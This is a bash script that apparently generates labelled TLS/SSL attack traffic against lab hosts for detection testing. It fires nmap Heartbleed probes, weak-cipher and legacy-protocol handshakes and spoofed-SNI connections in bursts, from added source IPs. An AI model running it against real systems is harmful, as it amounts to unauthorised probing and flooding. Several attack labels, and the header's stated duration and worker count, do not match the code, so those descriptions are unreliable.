#!/usr/bin/env bash
#
# tls_ssl_high_throughput.sh – High-Throughput TLS/SSL Attack Traffic Generator
# • Duration: 900s (15 min)
# • Workers: 200
# • Max background jobs: 500
# • Burst mode: 50 connections
# • Techniques: 49 TLS/SSL variants
#
set -euo pipefail

### CONFIGURATION ###
DURATION=600
TARGETS=(192.168.56.101 192.168.56.102)
SRC_IPS=(192.168.56.{240..254})
IFACE="enp0s3"
WORKERS=7
MAX_JOBS=30
BURST_SIZE=6
LOG_DIR="/tmp/tls_attacks_$(date +%Y%m%d_%H%M%S)"
VERBOSE=1

mkdir -p "$LOG_DIR"
echo "=== TLS/SSL High-Throughput Generator ==="
echo "Duration: ${DURATION}s | Workers: ${WORKERS} | Burst: ${BURST_SIZE}"
echo "Targets: ${TARGETS[*]}"
echo "Log dir: $LOG_DIR"
echo

### DEPENDENCIES ###
check_deps() {
  local miss=()
  for cmd in nmap openssl curl python3 timeout; do
    command -v "$cmd" &>/dev/null || miss+=("$cmd")
  done
  python3 -c 'import sslyze' &>/dev/null || miss+=(sslyze)
  if (( ${#miss[@]} )); then
    echo "ERROR: missing tools: ${miss[*]}" >&2
    echo "  sudo apt update && sudo apt install -y nmap openssl curl python3-pip" >&2
    echo "  pip3 install sslyze" >&2
    exit 1
  fi
}

### INTERFACE ###
setup_interface() {
  for ip in "${SRC_IPS[@]}"; do
    ip addr add "${ip}/24" dev "$IFACE" 2>/dev/null || :
  done
  iptables -I OUTPUT -o "$IFACE" -j ACCEPT 2>/dev/null || :
}

### CLEANUP ###
cleanup() {
  pkill -P $$ &>/dev/null || :
  for ip in "${SRC_IPS[@]}"; do
    ip addr del "${ip}/24" dev "$IFACE" 2>/dev/null || :
  done
  tar -czf "${LOG_DIR}.tar.gz" -C "$(dirname "$LOG_DIR")" "$(basename "$LOG_DIR")" 2>/dev/null || :
}
trap cleanup EXIT INT TERM

### LOGGING ###
log_atk() {
  local atk=$1 tgt=$2 src=$3
  echo "[$(date '+%F %T')] $atk -> $tgt (src:$src)" | tee -a "$LOG_DIR/attack_log.txt"
}

### 49 TLS/SSL ATTACK FUNCTIONS ###

# 1-3 Heartbleed
attack_hb_basic() {
  nmap -Pn -p443 --script ssl-heartbleed -e "$IFACE" -S "$2" "$1" -oN /dev/null &
}
attack_hb_var() {
  local L=$((16384 + RANDOM % 32768))
  nmap -Pn -p443 --script ssl-heartbleed -e "$IFACE" -S "$2" \
    --script-args="heartbleed-length=$L" "$1" -oN /dev/null &
}
attack_hb_frag() {
  nmap -Pn -p443 --script ssl-heartbleed -e "$IFACE" -S "$2" -f --mtu 8 "$1" -oN /dev/null &
}

# 4-6 POODLE
attack_poodle_ssl3() {
  openssl s_client -connect "$1":443 -ssl3 </dev/null &>/dev/null &
}
attack_poodle_tls1() {
  openssl s_client -connect "$1":443 -tls1 -cipher 'AES128-CBC-SHA' </dev/null &>/dev/null &
}
attack_poodle_pad() {
  for i in {1..5}; do
    openssl s_client -connect "$1":443 -tls1 -cipher 'DES-CBC3-SHA' </dev/null &>/dev/null &
    sleep 0.05
  done
}

# 7-8 BEAST
attack_beast_cbc() {
  openssl s_client -connect "$1":443 -tls1 -cipher 'AES128-SHA' </dev/null &>/dev/null &
}
attack_beast_msg() {
  for i in {1..5}; do
    openssl s_client -connect "$1":443 -tls1 -cipher 'AES128-SHA' -msg </dev/null &>/dev/null &
    sleep 0.1
  done
}

# 9-10 CRIME / BREACH
attack_crime() {
  nmap -Pn -p443 --script ssl-enum-ciphers -e "$IFACE" -S "$2" "$1" -oN /dev/null &
}
attack_breach() {
  for s in secret=1 secret=2 secret=3; do
    curl -k -d "$s" "https://$1" --connect-timeout 2 --max-time 5 &>/dev/null &
    sleep 0.1
  done
}

# 11-12 SWEET32
attack_sweet32_3des() {
  openssl s_client -connect "$1":443 -cipher 'DES-CBC3-SHA' </dev/null &>/dev/null &
}
attack_sweet32_bday() {
  for i in {1..8}; do
    openssl s_client -connect "$1":443 -cipher 'DES-CBC3-SHA' </dev/null &>/dev/null &
    sleep 0.05
  done
}

# 13-14 LOGJAM
attack_logjam_dhe() {
  openssl s_client -connect "$1":443 -cipher 'DHE-RSA-AES256-SHA' </dev/null &>/dev/null &
}
attack_logjam_weak() {
  local ciphers=(DHE-RSA-AES128-SHA DHE-RSA-AES256-SHA)
  local C=${ciphers[RANDOM % ${#ciphers[@]}]}
  openssl s_client -connect "$1":443 -cipher "$C" </dev/null &>/dev/null &
}

# 15-16 FREAK
attack_freak_rsa() {
  openssl s_client -connect "$1":443 -cipher 'RSA_EXPORT' </dev/null &>/dev/null &
}
attack_freak_dhe() {
  openssl s_client -connect "$1":443 -cipher 'DHE_RSA_EXPORT' </dev/null &>/dev/null &
}

# 17-18 DROWN
attack_drown_ssl2() {
  openssl s_client -connect "$1":443 -ssl2 </dev/null &>/dev/null &
}
attack_drown_xproto() {
  for p in 443 25 587 993 995; do
    timeout 3 openssl s_client -connect "$1:$p" -ssl2 </dev/null &>/dev/null &
    sleep 0.1
  done
}

# 19-23 RENEGOTIATION
attack_reneg_dos() {
  nmap -Pn -p443 --script ssl-enum-ciphers -e "$IFACE" -S "$2" "$1" -oN /dev/null &
}
attack_reneg_mitm() {
  for i in {1..3}; do
    openssl s_client -connect "$1":443 -msg </dev/null &>/dev/null &
    sleep 0.1
  done
}
attack_reneg_client() {
  openssl s_client -connect "$1":443 -cert /dev/null -key /dev/null </dev/null &>/dev/null &
}
attack_reneg_cipher() {
  openssl s_client -connect "$1":443 -cipher 'EXP-RC4-MD5' </dev/null &>/dev/null &
}
attack_reneg_secure() {
  openssl s_client -connect "$1":443 -tls1_2 -cipher 'AES256-GCM-SHA384' -no_ssl2 -no_ssl3 </dev/null &>/dev/null &
}

# 24-31 CERTIFICATE
attack_cert_val() {
  openssl s_client -connect "$1":443 -servername spoof.local -verify_return_error </dev/null &>/dev/null &
}
attack_cert_pin() {
  curl -k -H "Host: legit.local" "https://$1" --connect-timeout 2 --max-time 5 &>/dev/null &
}
attack_cert_trans() {
  curl -k "https://$1/.well-known/ct-test" --connect-timeout 2 --max-time 5 &>/dev/null &
}
attack_cert_chain() {
  openssl s_client -connect "$1":443 -showcerts </dev/null &>/dev/null &
}
attack_cert_keyconf() {
  openssl s_client -connect "$1":443 -cert /dev/null -key /dev/null </dev/null &>/dev/null &
}
attack_cert_sub() {
  openssl s_client -connect "$1":443 -servername ".${1}" </dev/null &>/dev/null &
}
attack_cert_wc() {
  openssl s_client -connect "$1":443 -servername "*.${1#*.}" </dev/null &>/dev/null &
}
attack_cert_imp() {
  openssl s_client -connect "$1":443 -servername "evil.ca" </dev/null &>/dev/null &
}

# 32-37 TIMING
attack_time_side() {
  for i in {1..5}; do (time openssl s_client -connect "$1":443 </dev/null &>/dev/null); done
}
attack_time_pad() {
  for i in {1..5}; do
    openssl s_client -connect "$1":443 -cipher 'AES128-CBC-SHA' -msg </dev/null &>/dev/null &
    sleep 0.1
  done
}
attack_time_rsa() {
  openssl s_client -connect "$1":443 -cipher 'RSA' </dev/null &>/dev/null &
}
attack_time_ecdsa() {
  openssl s_client -connect "$1":443 -cipher 'ECDHE-ECDSA-AES256-GCM-SHA384' </dev/null &>/dev/null &
}
attack_time_cache() {
  openssl s_client -connect "$1":443 </dev/null &>/dev/null &
}
attack_time_remote() {
  curl -s -w "%{time_total}" -o /dev/null "https://$1" &>/dev/null &
}

# 38-49 ADVANCED
attack_strip() {
  curl -k -L "https://$1" -H "User-Agent: SSLStrip/1.0" --connect-timeout 2 --max-time 5 &>/dev/null &
}
attack_kill() {
  openssl s_client -connect "$1":443 -cipher 'NULL' </dev/null &>/dev/null &
}
attack_beast_mitm() {
  openssl s_client -connect "$1":443 -tls1 -cipher 'AES128-SHA' -msg </dev/null &>/dev/null &
}
attack_comp_ratio() {
  curl -k -H "Accept-Encoding: gzip,deflate" "https://$1" --connect-timeout 2 --max-time 5 &>/dev/null &
}
attack_alpn() {
  openssl s_client -connect "$1":443 -alpn h2 </dev/null &>/dev/null &
}
attack_sni() {
  openssl s_client -connect "$1":443 -servername malicious.com </dev/null &>/dev/null &
}
attack_ocsp() {
  openssl s_client -connect "$1":443 -status </dev/null &>/dev/null &
}
attack_hsts() {
  curl -k -I "https://$1" | grep -qi hsts &>/dev/null &
}

# Array with all functions
ATKS=(
  attack_hb_basic attack_hb_var attack_hb_frag
  attack_poodle_ssl3 attack_poodle_tls1 attack_poodle_pad
  attack_beast_cbc attack_beast_msg
  attack_crime attack_breach
  attack_sweet32_3des attack_sweet32_bday
  attack_logjam_dhe attack_logjam_weak
  attack_freak_rsa attack_freak_dhe
  attack_drown_ssl2 attack_drown_xproto
  attack_reneg_dos attack_reneg_mitm attack_reneg_client attack_reneg_cipher attack_reneg_secure
  attack_cert_val attack_cert_pin attack_cert_trans attack_cert_chain attack_cert_keyconf attack_cert_sub attack_cert_wc attack_cert_imp
  attack_time_side attack_time_pad attack_time_rsa attack_time_ecdsa attack_time_cache attack_time_remote
  attack_strip attack_kill attack_beast_mitm attack_comp_ratio attack_alpn attack_sni attack_ocsp attack_hsts
)

### WORKER ###
worker() {
  local END=$1 ID=$2 COUNT=0
  while (( SECONDS < END )); do
    local TGT=${TARGETS[RANDOM % ${#TARGETS[@]}]}
    local SRC=${SRC_IPS[RANDOM % ${#SRC_IPS[@]}]}
    local FUN=${ATKS[RANDOM % ${#ATKS[@]}]}
    # burst
    for i in $(seq 1 $BURST_SIZE); do
      "$FUN" "$TGT" "$SRC"
    done
    log_atk "$FUN" "$TGT" "$SRC"
    (( COUNT+=BURST_SIZE ))
    # concurrency control
    while (( $(jobs -r | wc -l) > MAX_JOBS )); do sleep 0.01; done
    sleep 0.01
  done
  echo "[Worker $ID] attacked: $COUNT"
}

### MAIN ###
check_deps
setup_interface
END_TIME=$(( SECONDS + DURATION ))
for i in $(seq 1 $WORKERS); do
  worker "$END_TIME" "$i" & echo "W$i PID:$!"
  sleep 0.005
done
wait
echo "=== Generation finished. Logs in $LOG_DIR ==="
